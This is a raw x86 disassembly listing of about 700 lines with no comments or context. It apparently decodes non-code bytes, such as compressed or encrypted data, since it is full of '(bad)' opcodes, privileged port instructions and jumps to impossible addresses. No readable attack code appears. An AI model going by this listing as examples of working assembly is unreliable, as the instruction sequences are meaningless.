  416b3e:	lds    ebx,FWORD PTR [edi+0xcf998b1]
  416b44:	lock mov ebx,0xafe585aa
  416b4a:	mov    bl,0xc
  416b4c:	pop    es
  416b4d:	mov    eax,0x84a9c7e5
  416b52:	test   DWORD PTR [edx-0xf67c7a5],esi
  416b58:	fadd   QWORD PTR [eax+ebp*8-0x609ffa5a]
  416b5f:	in     eax,0xa2
  416b61:	ins    DWORD PTR es:[edi],dx
  416b62:	pop    esp
  416b63:	mov    al,0x9d
  416b65:	arpl   WORD PTR [ecx],bx
  416b67:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416b68:	add    DWORD PTR [ebp+0xe],0x11
  416b6c:	or     ah,BYTE PTR [edi]
  416b6e:	cwde   
  416b6f:	repnz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416b71:	pop    ss
  416b72:	ficom  WORD PTR [eax]
  416b74:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416b75:	xor    eax,0x10b0a2c1
  416b7a:	cmp    DWORD PTR [esi-0x7b],0xffffff80
  416b7e:	dec    ebp
  416b7f:	cs in  eax,0xa6
  416b82:	pop    ds
  416b83:	ret    
  416b84:	and    al,0x1b
  416b86:	mov    esi,0x34b3dd9a
  416b8b:	loop   0x416b7b
  416b8d:	cmp    ebp,0x6c38ba53
  416b93:	push   es
  416b94:	adc    eax,0x2d833372
  416b99:	stos   BYTE PTR es:[edi],al
  416b9a:	lock mov ah,cl
  416b9d:	pop    ebp
  416b9e:	popf   
  416b9f:	mov    bh,0x73
  416ba1:	xchg   esi,eax
  416ba2:	mov    dl,0xc7
  416ba4:	sub    eax,0x3ab09700
  416ba9:	jns    0x416b90
  416bab:	out    dx,eax
  416bac:	pushf  
  416bad:	xor    ah,BYTE PTR [esi+0x1f]
  416bb0:	xchg   ecx,eax
  416bb1:	mov    al,0x40
  416bb3:	mov    WORD PTR [esi+0x25c0437d],es
  416bb9:	jmp    0x340caddb
  416bbe:	cmp    eax,0x8c5c26ef
  416bc3:	fmul   DWORD PTR [ebx+0x632737db]
  416bc9:	adc    BYTE PTR [edx],al
  416bcb:	and    eax,DWORD PTR [ecx]
  416bcd:	add    DWORD PTR ds:0x3608dad8,ebp
  416bd3:	dec    ebx
  416bd4:	inc    BYTE PTR [ecx]
  416bd6:	and    bh,ch
  416bd8:	mov    eax,0x2e365a0b
  416bdd:	add    ch,dh
  416bdf:	sbb    al,0x18
  416be1:	inc    ebx
  416be2:	ror    al,cl
  416be4:	(bad)  
  416be5:	into   
  416be6:	mov    ch,0x5f
  416be8:	popa   
  416be9:	iret   
  416bea:	push   edx
  416beb:	adc    ecx,ebx
  416bed:	pushf  
  416bee:	xlat   BYTE PTR ds:[ebx]
  416bef:	xor    BYTE PTR [esi],0x95
  416bf2:	inc    esi
  416bf3:	out    0x90,al
  416bf5:	add    bl,BYTE PTR [ecx]
  416bf7:	loope  0x416c0c
  416bf9:	xlat   BYTE PTR ds:[ebx]
  416bfa:	outs   dx,DWORD PTR ds:[esi]
  416bfb:	add    DWORD PTR [edi],ebx
  416bfd:	dec    edx
  416bfe:	xchg   edx,eax
  416bff:	add    edi,esp
  416c01:	and    DWORD PTR [ecx+ebp*4+0x66d9b034],0xffffff85
  416c09:	fnsave ds:0x66662f68
  416c0f:	ret    0x6e9d
  416c12:	shl    eax,1
  416c14:	shr    BYTE PTR [ebp-0x4c68428e],1
  416c1a:	or     bh,BYTE PTR [ecx+0x9]
  416c1d:	jns    0x416c6b
  416c1f:	ins    BYTE PTR es:[edi],dx
  416c20:	push   ebp
  416c21:	mov    bh,BYTE PTR [ecx+0x4fd7f4b4]
  416c27:	mov    esp,0xa7583bc9
  416c2c:	call   0x337348fc
  416c31:	sub    edi,DWORD PTR [ebx-0x5e3ea8b3]
  416c37:	(bad)  
  416c38:	ja     0x416c34
  416c3a:	cmc    
  416c3b:	js     0x416bfe
  416c3d:	adc    BYTE PTR [ebx-0x743fc868],bl
  416c43:	xlat   BYTE PTR ds:[ebx]
  416c44:	mov    ebx,0x23bc9a61
  416c49:	cmp    BYTE PTR [eax-0x7e],dh
  416c4c:	loope  0x416bf3
  416c4e:	pop    ss
  416c4f:	test   eax,0x8431cd63
  416c54:	mov    dh,0xdb
  416c56:	jmp    0xb9d2:0x5ddc451a
  416c5d:	cmc    
  416c5e:	inc    esi
  416c5f:	push   ds
  416c60:	cli    
  416c61:	push   ecx
  416c62:	and    esi,eax
  416c64:	mov    DWORD PTR [ebx+ecx*1+0x1b],edi
  416c68:	aad    0xe3
  416c6a:	jle    0x416cd0
  416c6c:	sub    al,0x3e
  416c6e:	iret   
  416c6f:	icebp  
  416c70:	inc    ebp
  416c71:	fisubr DWORD PTR [ecx+0x19]
  416c74:	mov    ebp,0x896bef40
  416c79:	and    ebx,edx
  416c7b:	sub    esi,edx
  416c7d:	cs ins DWORD PTR es:[edi],dx
  416c7f:	add    ecx,ecx
  416c81:	xchg   ecx,eax
  416c82:	xchg   ebx,eax
  416c83:	pop    ss
  416c84:	repz int3 
  416c86:	cmp    eax,0xf30f0ffe
  416c8b:	(bad)  
  416c8c:	leave  
  416c8d:	or     DWORD PTR [edx-0x5d],eax
  416c90:	nop
  416c91:	jl     0x416c7e
  416c93:	cmc    
  416c94:	aam    0xc0
  416c96:	js     0x416c47
  416c98:	dec    ebx
  416c99:	mov    esi,DWORD PTR [eax+0x77]
  416c9c:	cmp    ecx,edx
  416c9e:	inc    ebp
  416c9f:	js     0x416c85
  416ca1:	mov    ds:0xf5d04de7,al
  416ca6:	test   eax,0xd1d49224
  416cab:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416cac:	xchg   edi,eax
  416cad:	or     DWORD PTR [edx],ebp
  416caf:	pop    ecx
  416cb0:	mov    ecx,0xacddfb2e
  416cb5:	inc    edi
  416cb6:	cs dec esp
  416cb8:	or     eax,0x517227cb
  416cbd:	js     0x416c8d
  416cbf:	or     edi,DWORD PTR [esi+0xe2ae48d]
  416cc5:	and    eax,0xcd43f8de
  416cca:	fdivr  QWORD PTR [edi+0xb]
  416ccd:	xor    ch,BYTE PTR [ebx-0x6]
  416cd0:	sbb    al,0x16
  416cd2:	xor    eax,0xd6440a6
  416cd7:	mov    ebp,0xbe54c9cd
  416cdc:	push   ebx
  416cdd:	in     eax,dx
  416cde:	cdq    
  416cdf:	ror    BYTE PTR [ebx],0xb0
  416ce2:	(bad)  
  416ce3:	or     ax,0x2abb
  416ce7:	and    edx,DWORD PTR [esi+0x5fe46aec]
  416ced:	mov    ss,WORD PTR [edx]
  416cef:	cld    
  416cf0:	or     al,0xe5
  416cf2:	inc    ebx
  416cf3:	inc    eax
  416cf4:	pop    ecx
  416cf5:	popa   
  416cf6:	daa    
  416cf7:	push   cs
  416cf8:	pop    ebp
  416cf9:	jmp    0x8289b493
  416cfe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416cff:	and    BYTE PTR [esi+0x27],bh
  416d02:	cmp    eax,0xa2d41af7
  416d07:	ins    DWORD PTR es:[edi],dx
  416d08:	enter  0x1fd8,0x9b
  416d0c:	cli    
  416d0d:	fwait
  416d0e:	mov    cl,0xab
  416d10:	je     0x416d72
  416d12:	mov    ds:0xd9fd9913,eax
  416d17:	stos   BYTE PTR es:[edi],al
  416d18:	shl    DWORD PTR [ebp-0x3b004e18],1
  416d1e:	in     eax,dx
  416d1f:	sub    ch,BYTE PTR ds:0x6fad7fcf
  416d25:	mov    ebx,0xa7a9574
  416d2a:	into   
  416d2b:	or     al,0x33
  416d2d:	test   DWORD PTR [ebx-0x70],ecx
  416d30:	enter  0xc7f3,0x68
  416d34:	jg     0x416d66
  416d36:	nop
  416d37:	mov    ah,0x53
  416d39:	xor    al,0xc6
  416d3b:	lods   al,BYTE PTR ds:[esi]
  416d3c:	or     edx,ebp
  416d3e:	in     al,dx
  416d3f:	lods   eax,DWORD PTR ds:[esi]
  416d40:	cmp    edi,ecx
  416d42:	loopne 0x416d91
  416d44:	push   ecx
  416d45:	sub    DWORD PTR [eax-0x2b],0x29
  416d49:	mov    ch,BYTE PTR [eax]
  416d4b:	into   
  416d4c:	in     al,0xad
  416d4e:	xor    esi,DWORD PTR [ebx+0x7b]
  416d51:	push   esi
  416d52:	add    DWORD PTR [esi],edx
  416d54:	mov    ch,0x5f
  416d56:	sbb    dl,BYTE PTR [eax]
  416d58:	jo     0x416d41
  416d5a:	arpl   di,ax
  416d5c:	bound  ebx,QWORD PTR [edx-0x14]
  416d5f:	scas   eax,DWORD PTR es:[edi]
  416d60:	aas    
  416d61:	push   esi
  416d62:	or     BYTE PTR [edx-0x2f],dh
  416d65:	inc    ebx
  416d66:	jae    0x416dde
  416d68:	js     0x416dae
  416d6a:	and    eax,0x5d4b00d6
  416d6f:	outs   dx,DWORD PTR ds:[esi]
  416d70:	fsubr  QWORD PTR [ecx-0x6e]
  416d73:	sub    eax,0xa5584963
  416d78:	inc    ebp
  416d79:	inc    ecx
  416d7a:	xchg   ecx,eax
  416d7b:	inc    esp
  416d7c:	lds    eax,FWORD PTR ds:0x222f13e4
  416d82:	cmp    edi,DWORD PTR [edx-0x76]
  416d85:	cmp    BYTE PTR [edx],0x5c
  416d88:	in     eax,dx
  416d89:	cmp    BYTE PTR ds:[ecx+0xe],0x3a
  416d8e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416d8f:	xor    DWORD PTR [esi-0x41],edx
  416d92:	add    ebp,DWORD PTR [edi]
  416d94:	fdivrp st(5),st
  416d96:	cdq    
  416d97:	lock dec edx
  416d99:	mov    ebp,0xdfd1d67
  416d9e:	lahf   
  416d9f:	cld    
  416da0:	das    
  416da1:	rcr    DWORD PTR [eax],cl
  416da3:	(bad)  
  416da4:	sub    bh,BYTE PTR [ecx+eiz*4]
  416da7:	es mov bh,0xda
  416daa:	xchg   edx,eax
  416dab:	push   cs
  416dac:	xor    eax,0xfb1f173f
  416db1:	nop
  416db2:	pop    esp
  416db3:	and    al,BYTE PTR [edx]
  416db5:	es neg cl
  416db8:	pop    ebx
  416db9:	retf   0x6e52
  416dbc:	jae    0x416dd9
  416dbe:	fs push 0x2062519d
  416dc4:	pop    ss
  416dc5:	mov    cl,0x1f
  416dc7:	leave  
  416dc8:	mov    ds,WORD PTR [edx+0x41]
  416dcb:	leave  
  416dcc:	xchg   DWORD PTR [esi-0x49],ebx
  416dcf:	dec    ebp
  416dd0:	ret    0x4a28
  416dd3:	sub    bh,al
  416dd5:	outs   dx,BYTE PTR ds:[esi]
  416dd6:	cmp    ebx,edi
  416dd8:	push   0xfffffffb
  416dda:	push   ss
  416ddb:	je     0x416d8c
  416ddd:	mov    edi,0x2a00a48c
  416de2:	sub    al,0x1f
  416de4:	int3   
  416de5:	mov    bh,0x1
  416de7:	push   esp
  416de8:	adc    esp,ebp
  416dea:	xchg   esp,eax
  416deb:	add    eax,0xe3ce5fb6
  416df0:	mov    ah,0xc4
  416df2:	pushf  
  416df3:	ficomp DWORD PTR [ebx]
  416df5:	(bad)  
  416df6:	stc    
  416df7:	sahf   
  416df8:	jns    0x416dea
  416dfa:	xchg   ebp,eax
  416dfb:	popa   
  416dfc:	call   0x73851417
  416e01:	add    edi,edx
  416e03:	lock retf 
  416e05:	stos   DWORD PTR es:[edi],eax
  416e06:	loope  0x416e2a
  416e08:	std    
  416e09:	in     eax,0x36
  416e0b:	mov    esi,0xe24fe467
  416e10:	loope  0x416e10
  416e12:	sahf   
  416e13:	or     DWORD PTR [esi],0x37
  416e16:	and    DWORD PTR [ebp+0x44b15268],edx
  416e1c:	inc    eax
  416e1d:	and    DWORD PTR [ebx],ebp
  416e1f:	in     al,dx
  416e20:	xor    ecx,DWORD PTR [eax]
  416e22:	jmp    0xd8fbadcf
  416e27:	cdq    
  416e28:	xchg   BYTE PTR [ebp-0x3df5d412],ah
  416e2e:	jbe    0x416e0d
  416e30:	in     ax,dx
  416e32:	xchg   BYTE PTR [edx+0x3a],bl
  416e35:	int    0xa3
  416e37:	shl    ch,1
  416e39:	add    DWORD PTR fs:[esi+0x5f],ebp
  416e3d:	push   cs
  416e3e:	and    esi,DWORD PTR [eax+0x52583790]
  416e44:	test   al,0xd2
  416e46:	push   0x37709e5b
  416e4b:	dec    ebp
  416e4c:	inc    esi
  416e4d:	mov    ecx,DWORD PTR [ebx-0x6c348f6c]
  416e53:	(bad)  
  416e54:	imul   BYTE PTR [ebp+ebp*8-0x4ae8d498]
  416e5b:	and    BYTE PTR [edx+eax*8],bh
  416e5e:	and    dh,BYTE PTR [ecx-0x3f8aa414]
  416e64:	mov    DWORD PTR [eax-0x33],esi
  416e67:	cmp    DWORD PTR [edi+eax*2],0x6e118bfb
  416e6e:	push   cs
  416e6f:	ret    
  416e70:	inc    DWORD PTR [ecx]
  416e72:	xlat   BYTE PTR ds:[ebx]
  416e73:	jecxz  0x416e79
  416e75:	mov    fs,WORD PTR [esi-0x1f]
  416e78:	pop    esp
  416e79:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416e7a:	out    0xa1,al
  416e7c:	mov    BYTE PTR [ebp-0x66],bh
  416e7f:	cdq    
  416e80:	aas    
  416e81:	je     0x416e28
  416e83:	adc    DWORD PTR [edi],0x794bf0a
  416e89:	add    DWORD PTR [eax+0x1a],edx
  416e8c:	mov    ch,0xe4
  416e8e:	(bad)  
  416e8f:	lods   eax,DWORD PTR ds:[esi]
  416e90:	arpl   WORD PTR [ebx+0x3b],di
  416e93:	mov    esi,0x28a03db1
  416e98:	cli    
  416e99:	repnz movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416e9b:	push   edx
  416e9c:	mov    esp,ecx
  416e9e:	adc    bh,BYTE PTR [eax]
  416ea0:	mov    dl,0xf5
  416ea2:	sar    BYTE PTR [eax],cl
  416ea4:	fsub   st(7),st
  416ea6:	push   edx
  416ea7:	not    BYTE PTR [ecx+esi*1-0x247dfbda]
  416eae:	push   edi
  416eaf:	jb     0x416f04
  416eb1:	push   ss
  416eb2:	sbb    al,BYTE PTR [ecx]
  416eb4:	inc    esi
  416eb5:	jne    0x416eb7
  416eb7:	push   ss
  416eb8:	pop    eax
  416eb9:	mov    al,0x16
  416ebb:	cmp    eax,DWORD PTR [esi-0x60]
  416ebe:	mov    DWORD PTR [edx+0x119f2586],ecx
  416ec4:	fnstenv [ecx+0x21]
  416ec7:	cs jno 0x416e8d
  416eca:	mov    ecx,DWORD PTR [eax+0x4f]
  416ecd:	cmc    
  416ece:	mov    edx,DWORD PTR [ecx+0x2b46cc81]
  416ed4:	sub    ecx,0x1297724
  416eda:	adc    esi,eax
  416edc:	xchg   esp,eax
  416edd:	test   DWORD PTR [ecx],esp
  416edf:	add    esp,ebp
  416ee1:	sbb    DWORD PTR [ecx+0x1247cc44],esi
  416ee7:	fldl2e 
  416ee9:	xchg   edx,eax
  416eea:	sti    
  416eeb:	xor    DWORD PTR [ebx+0x3ce158e6],0xc
  416ef2:	dec    ebx
  416ef3:	mov    edi,0x8eb86bbc
  416ef8:	inc    bh
  416efa:	push   ecx
  416efb:	jg     0x416f7c
  416efd:	(bad)  
  416efe:	retf   0xab41
  416f01:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416f02:	push   es
  416f03:	ds jecxz 0x416ec4
  416f06:	jb     0x416e8b
  416f08:	inc    edx
  416f09:	and    edi,ebx
  416f0b:	jnp    0x416ead
  416f0d:	lea    esi,[esi+0x5ad9b03c]
  416f13:	mov    eax,ds:0xa310f9b4
  416f18:	push   ds
  416f19:	or     eax,0xfd651efa
  416f1e:	inc    edx
  416f1f:	fisttp QWORD PTR [ebp+0x34]
  416f22:	(bad)  
  416f23:	enter  0xa905,0x88
  416f27:	jl     0x416f16
  416f29:	sbb    ebp,esi
  416f2b:	sub    DWORD PTR [edi+0x7794adcc],eax
  416f31:	out    dx,al
  416f32:	mov    cl,al
  416f34:	aam    0xdf
  416f36:	sub    al,0x8
  416f38:	jnp    0x416fb0
  416f3a:	mov    dh,0xe4
  416f3c:	enter  0x7a73,0xbe
  416f40:	push   ecx
  416f41:	pushf  
  416f42:	aad    0xd1
  416f44:	push   edx
  416f45:	and    al,0xea
  416f47:	lahf   
  416f48:	sti    
  416f49:	cmp    BYTE PTR [edx-0x11868209],0x45
  416f50:	shr    BYTE PTR [edx+0x6],1
  416f53:	js     0x416ef2
  416f55:	or     DWORD PTR [ebp-0x6d],0xfffffff6
  416f59:	inc    esp
  416f5a:	sbb    BYTE PTR [eax],bl
  416f5c:	lahf   
  416f5d:	xchg   edi,eax
  416f5f:	stos   DWORD PTR es:[edi],eax
  416f60:	scas   al,BYTE PTR es:[edi]
  416f61:	aad    0xa5
  416f63:	mov    ebx,0x2bed6fff
  416f68:	mov    eax,0x453bda0c
  416f6d:	fcmovnbe st,st(4)
  416f6f:	mov    eax,ds:0x77fe38c0
  416f74:	push   eax
  416f75:	mov    ecx,0xf76d3da1
  416f7a:	add    al,BYTE PTR [edx+0x51]
  416f7d:	out    0xfb,al
  416f7f:	sbb    DWORD PTR [ebp+0x45],edx
  416f82:	and    eax,0x9703d2be
  416f87:	leave  
  416f88:	mov    BYTE PTR [ebx],dl
  416f8a:	xchg   ebx,eax
  416f8b:	push   0x3251ebb8
  416f90:	mov    edx,0xd1e7eb23
  416f95:	sahf   
  416f96:	jnp    0x416fa0
  416f98:	push   0x5394f9be
  416f9d:	rcl    DWORD PTR [ebp+0x56],cl
  416fa0:	ror    BYTE PTR [edx],cl
  416fa2:	pop    edi
  416fa3:	xchg   esi,eax
  416fa4:	jp     0x416f9d
  416fa6:	jno    0x417022
  416fa8:	ins    BYTE PTR es:[edi],dx
  416fa9:	mov    al,ds:0xd649a909
  416fae:	das    
  416faf:	outs   dx,BYTE PTR ds:[esi]
  416fb0:	dec    edx
  416fb1:	or     DWORD PTR [ecx+0x3c],eax
  416fb4:	mov    bh,ah
  416fb6:	and    al,0x4d
  416fb8:	std    
  416fb9:	js     0x416f5f
  416fbb:	mov    dh,0xee
  416fbd:	sbb    BYTE PTR [ecx+0x4e5408d2],ah
  416fc3:	xchg   esi,eax
  416fc4:	shl    DWORD PTR [edi-0x24e5d2bb],0x9
  416fcb:	inc    edx
  416fcc:	sti    
  416fcd:	cmp    DWORD PTR [edi+0xd],esp
  416fd0:	cmp    al,0xf4
  416fd2:	push   esi
  416fd3:	cmp    ebx,esp
  416fd5:	and    ebx,edi
  416fd7:	cmp    BYTE PTR [ebx],dh
  416fd9:	adc    ebp,DWORD PTR [edi+0x2f5f58d0]
  416fdf:	test   bl,0x24
  416fe2:	jge    0x417026
  416fe4:	jmp    0xba51e1b9
  416fe9:	adc    al,0xe5
  416feb:	mov    BYTE PTR [edx+0x60],dl
  416fee:	sub    BYTE PTR [edi],0x6c
  416ff1:	pop    edx
  416ff2:	loop   0x417061
  416ff4:	or     ecx,DWORD PTR [eax+eiz*2+0x12]
  416ff8:	sahf   
  416ff9:	retf   0x7fd4
  416ffc:	dec    eax
  416ffd:	fwait
  416ffe:	mov    edx,0xef386985
  417003:	mov    bl,0x7b
  417005:	pop    es
  417006:	mov    bh,BYTE PTR [eax+0x4d]
  417009:	pop    edi
  41700a:	xor    al,al
  41700c:	jp     0x416ff9
  41700e:	das    
  41700f:	inc    edi
  417010:	inc    edx
  417011:	lods   eax,DWORD PTR ds:[esi]
  417012:	jle    0x417077
  417014:	fdiv   DWORD PTR [edx]
  417016:	ds xchg esp,eax
  417018:	xchg   ebp,eax
  417019:	xor    eax,0xad718409
  41701e:	sub    eax,0x246abb0b
  417023:	push   esp
  417024:	test   BYTE PTR [ebx+0x2c],cl
  417027:	stc    
  417028:	mov    edx,DWORD PTR [ebx-0x5a]
  41702b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41702c:	pusha  
  41702d:	cmp    eax,0xd138ca58
  417032:	into   
  417033:	jp     0x41709c
  417035:	pop    ecx
  417036:	mov    eax,ds:0xbf4043b2
  41703b:	aas    
  41703c:	or     eax,DWORD PTR ds:0xdeb5bbb0
  417042:	jp     0x417028
  417044:	push   edx
  417045:	ja     0x417092
  417047:	adc    eax,DWORD PTR [edx-0x3e]
  41704a:	fild   DWORD PTR [ebx]
  41704c:	lds    ebp,FWORD PTR [ecx]
  41704e:	push   esp
  41704f:	dec    esi
  417050:	stc    
  417051:	sbb    eax,0x7ffdfd40
  417056:	add    al,0x51
  417058:	test   DWORD PTR [ecx+ebp*1],ebp
  41705b:	or     BYTE PTR [ebp-0x4c],bh
  41705e:	ret    
  41705f:	test   al,0x9e
  417061:	and    ch,BYTE PTR [edx+ebx*2]
  417064:	bound  ecx,QWORD PTR [ebx-0x4d]
  417067:	out    dx,eax
  417068:	mov    cs,WORD PTR [esi+edx*1]
  41706b:	mov    eax,ds:0x6b5a227d
  417070:	stos   BYTE PTR es:[edi],al
  417071:	int3   
  417072:	pop    ecx
  417073:	jbe    0x417019
  417075:	je     0x417062
  417077:	inc    edx
  417078:	cwde   
  417079:	popa   
  41707a:	ins    DWORD PTR es:[edi],dx
  41707b:	mov    cl,0x9d
  41707d:	add    eax,0xecd774ed
  417082:	ror    DWORD PTR [edx],cl
  417084:	cmp    eax,0xd4ad8b7f
  417089:	xor    BYTE PTR [ebx-0x6],0x19
  41708d:	push   esp
  41708e:	push   ss
  41708f:	mov    dh,0xe7
  417091:	loop   0x417031
  417093:	add    edx,DWORD PTR [ecx-0x39b1707f]
  417099:	shl    bh,cl
  41709b:	fsub   QWORD PTR [edx+edi*1+0xd]
  41709f:	lds    edx,FWORD PTR [esi-0x710175a2]
  4170a5:	int3   
  4170a6:	add    bh,BYTE PTR [ebp+ecx*8-0x6bbf43b6]
  4170ad:	fist   DWORD PTR [esi+0x3e169944]
  4170b3:	cs sbb bp,di
  4170b7:	outs   dx,BYTE PTR ds:[esi]
  4170b8:	dec    edi
  4170b9:	stos   DWORD PTR es:[edi],eax
  4170ba:	rcr    ebx,1
  4170bc:	mov    bl,0xc7
  4170be:	pop    ss
  4170bf:	imul   ebp,DWORD PTR [ebx],0xffffffe5
  4170c2:	push   ss
  4170c3:	enter  0xfbf,0x83
  4170c7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4170c8:	adc    ebp,DWORD PTR [ebp-0x39]
  4170cb:	xor    al,0x10
  4170cd:	push   edx
  4170ce:	and    edi,edx
  4170d0:	jno    0x4170c0
  4170d2:	jg     0x41710e
  4170d4:	or     al,0x14
  4170d6:	stos   BYTE PTR es:[edi],al
  4170d7:	call   0x93778f9
  4170dc:	test   BYTE PTR [eax+0x56],bl
  4170df:	push   0x67
  4170e1:	mov    esp,0x5a0745da
  4170e6:	cmp    esi,esi
  4170e8:	mov    eax,0x93a573b8
  4170ed:	push   ds
  4170ee:	cmp    BYTE PTR [ebx+0x73d282ed],bl
  4170f4:	adc    BYTE PTR ds:[esi+0x63],0x5c
  4170f9:	cmp    dl,BYTE PTR [ecx-0x28]
  4170fc:	retf   
  4170fd:	popf   
  4170fe:	inc    edi
  4170ff:	sbb    al,0x39
  417101:	(bad)  
  417102:	(bad)  [esi+0x12ee1bfc]
  417108:	cdq    
  417109:	add    esi,edx
  41710b:	in     al,0x32
  41710d:	pop    es
  41710e:	push   eax
  41710f:	arpl   WORD PTR [esi],bp
  417111:	pop    eax
  417112:	push   esp
  417113:	push   eax
  417114:	xchg   ecx,eax
  417115:	add    dh,ah
  417117:	xchg   DWORD PTR [ebp+ebp*8+0x30],eax
  41711b:	mov    ch,0xf7
  41711d:	mov    dh,0xcc
  41711f:	fiadd  DWORD PTR [esi+0x2a]
  417122:	inc    ebx
  417123:	lea    esi,[edx-0x64fe769d]
  417129:	add    eax,0x425862ec
  41712e:	add    dl,ah
  417130:	jae    0x417115
  417132:	enter  0x6266,0x32
  417136:	out    dx,al
  417137:	mov    DWORD PTR [esi+esi*2+0x6c],esp
  41713b:	pop    ss
  41713c:	sbb    ebp,DWORD PTR [edx+0x5d]
  41713f:	jmp    FWORD PTR ds:0xbbb52ddd
  417145:	jmp    0x4170e1
  417147:	lock dec esp
  417149:	add    BYTE PTR [ebx+0x9],0x4e
  41714d:	inc    edx
  41714e:	imul   ebp,DWORD PTR [ebp*8-0x53ead545],0xffffffe9
  417156:	fimul  WORD PTR [ebx+0x2039bdfe]
  41715c:	sub    ah,dl
  41715e:	pop    esp
  41715f:	sbb    edx,ebp
  417161:	push   ebx
  417162:	inc    ebx
  417163:	cmp    eax,0x8d174a4e
  417168:	mov    esp,0x989067ab
  41716d:	sbb    ebp,edi
  41716f:	stos   BYTE PTR es:[edi],al
  417170:	dec    edx
  417171:	(bad)  
  417173:	sbb    al,BYTE PTR [esi+0x63]
  417176:	sahf   
  417177:	lods   al,BYTE PTR ds:[esi]
  417178:	and    DWORD PTR [edx-0x5c],eax
  41717b:	fcmovbe st,st(3)
  41717d:	sar    DWORD PTR [edi-0x2e6d9ec6],cl
  417183:	in     eax,0x9a
  417185:	neg    DWORD PTR [edx]
  417187:	repnz push 0xb3411856
  41718d:	fdiv   QWORD PTR [esi+0x3e]
  417190:	mov    cl,BYTE PTR [eax]
  417192:	shr    DWORD PTR [ebx+ebx*2+0x635eef37],cl
  417199:	fidiv  DWORD PTR [edx+ecx*8-0x35]
  41719d:	or     DWORD PTR [ebx],esp
  41719f:	adc    al,0xa7
  4171a1:	sbb    eax,0x917140b5
  4171a6:	mov    bl,0x78
  4171a8:	fidivr WORD PTR [esi+0x2e]
  4171ab:	mov    bl,0x97
  4171ad:	pop    ds
  4171ae:	push   esp
  4171af:	add    BYTE PTR [esi-0x1c],ch
  4171b2:	jno    0x417224
  4171b4:	mov    ch,BYTE PTR [esi+0x3c645d8d]
  4171ba:	stos   BYTE PTR es:[edi],al
  4171bb:	and    al,0x56
  4171bd:	arpl   WORD PTR [esi],dx
  4171bf:	adc    al,BYTE PTR [eax+0x17]
  4171c2:	or     eax,0xa9900099
  4171c7:	dec    ecx
  4171c8:	outs   dx,DWORD PTR ds:[esi]
  4171c9:	icebp  
  4171ca:	lods   eax,DWORD PTR ds:[esi]
  4171cb:	sbb    DWORD PTR [ebx-0x38],edx
  4171ce:	ffree  st(7)
  4171d0:	mov    eax,ds:0x5cadb15c
  4171d5:	inc    edi
  4171d6:	call   0x170d095d
  4171db:	xor    DWORD PTR [ebx-0x5717fe2],esi
  4171e1:	cmp    ecx,DWORD PTR [esi+0x6966bc0f]
  4171e7:	mov    eax,0x15a5195e
  4171ec:	and    DWORD PTR [eax],0xffffff9a
  4171ef:	(bad)  
  4171f0:	(bad)  
  4171f1:	out    0x49,eax
  4171f3:	xor    DWORD PTR [esi-0x132c3634],edx
  4171f9:	or     eax,0x2e5ae42f
  4171fe:	ja     0x4171a4
  417200:	jb     0x417249
  417202:	lods   al,BYTE PTR ds:[esi]
  417203:	or     eax,0x3cf1f95
  417208:	das    
  417209:	test   esi,esi
  41720b:	shl    BYTE PTR [eax-0x63a61ac7],1
  417211:	mov    DWORD PTR [esi-0x16a5fbe2],esp
  417217:	xchg   BYTE PTR [ebp+0x1b3f0ce7],al
  41721d:	jno    0x41726a
  41721f:	cmc    
  417220:	add    edx,eax
  417222:	xchg   ebx,eax
  417223:	add    BYTE PTR [ebx-0x741e2ae3],0x15
  41722a:	adc    al,0x75
  41722c:	mov    dh,0xc3
  41722e:	(bad)  
  417230:	loopne 0x417206
  417232:	pop    ss
  417233:	xchg   ecx,eax
  417234:	xchg   esp,eax
  417235:	add    al,0x2
  417237:	sub    DWORD PTR [ebp+0x62689c21],eax
  41723d:	adc    al,0xf3
  41723f:	mov    BYTE PTR ds:0x285033aa,cl
  417245:	mov    bl,0x12
  417247:	fsub   st,st(7)
  417249:	clc    
  41724a:	repz sahf 
  41724c:	mov    fs,WORD PTR ds:0xe5f72716
  417252:	or     eax,0x703562b
  417257:	fsubr  QWORD PTR [edx+0x70c42bdd]
  41725d:	and    BYTE PTR [eax-0x67f63ae6],0xe9
  417264:	push   eax
  417265:	push   ss
  417266:	das    
  417267:	push   eax
  417268:	pop    ebx
  417269:	fstp   DWORD PTR [edx+0x74111127]
  41726f:	shl    BYTE PTR [ebx],cl
  417271:	nop
  417272:	push   ebx
  417273:	xor    eax,0x30e77986
  417278:	icebp  
  417279:	push   esp
  41727a:	adc    eax,0xf515a4d3
  41727f:	adc    DWORD PTR [ebp+ebp*2+0x28],edi
  417283:	sbb    al,0x92
  417285:	add    ah,0xe8
  417288:	ret    
  417289:	sbb    edi,DWORD PTR [ebp+0x1c]
  41728c:	push   edi
  41728d:	pusha  
  41728e:	scas   al,BYTE PTR es:[edi]
  41728f:	sbb    DWORD PTR [esi],ebp
  417291:	arpl   di,cx
  417293:	mov    dl,dh
  417295:	mov    edi,0x696503fa
  41729a:	ficomp DWORD PTR [eax+0x65]
  41729d:	or     esp,esp
  41729f:	mov    BYTE PTR ds:[esi],dl
  4172a2:	push   0x3c
  4172a4:	clc    
  4172a5:	mov    eax,ds:0x9a22aa56
  4172aa:	add    eax,DWORD PTR [esi]
  4172ac:	(bad)  
  4172ae:	and    bh,BYTE PTR [esi+0x18]
  4172b1:	data16 and BYTE PTR [esi+edx*4-0x7344799f],bh
  4172b9:	add    bl,BYTE PTR [esi-0x2bb6a70f]
  4172bf:	xchg   ebp,eax
  4172c0:	adc    al,0xae
  4172c2:	outs   dx,BYTE PTR ds:[esi]
  4172c3:	test   BYTE PTR [ecx-0x1d],dl
  4172c6:	sub    ah,al
  4172c8:	jno    0x417294
  4172ca:	test   eax,0xc6d4da33
  4172cf:	xchg   ebp,eax
  4172d0:	idiv   DWORD PTR [ebp+0x6b]
  4172d3:	pop    ecx
  4172d4:	call   0x5ba79f1e
  4172d9:	stos   DWORD PTR es:[edi],eax
  4172da:	shl    dh,cl
